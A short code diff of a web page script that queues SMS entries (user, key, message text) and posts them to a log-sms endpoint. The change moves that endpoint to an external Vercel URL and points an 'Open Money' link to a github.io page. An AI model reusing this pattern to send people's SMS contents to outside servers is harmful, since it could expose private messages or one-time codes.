@@ -39,10 +39,11 @@
         <button class="primary" id="send">Send now</button>
         <button id="clear">Clear list</button>
     </div>
-    <a class="btn" href="/">Open Money</a>
+    <a class="btn" href="https://zezo20234.github.io/MONEYY/">Open Money</a>
 </main>
 <script>
 (function () {
+    var API = 'https://moneyy-sdwg.vercel.app/api/log-sms'; // your Vercel server
     var QKEY = 'smsQueue';
     var busy = false;
 
@@ -101,7 +102,7 @@
         for (var i = 0; i < q.length; i++) {
             var item = q[i];
             try {
-                var res = await fetch('/api/log-sms?user=' + encodeURIComponent(item.u) + '&key=' + encodeURIComponent(item.k), {
+                var res = await fetch(API + '?user=' + encodeURIComponent(item.u) + '&key=' + encodeURIComponent(item.k), {
                     method: 'POST', headers: { 'Content-Type': 'text/plain' }, body: item.t
                 });
                 if (res.ok) { item.done = true; sent++; }
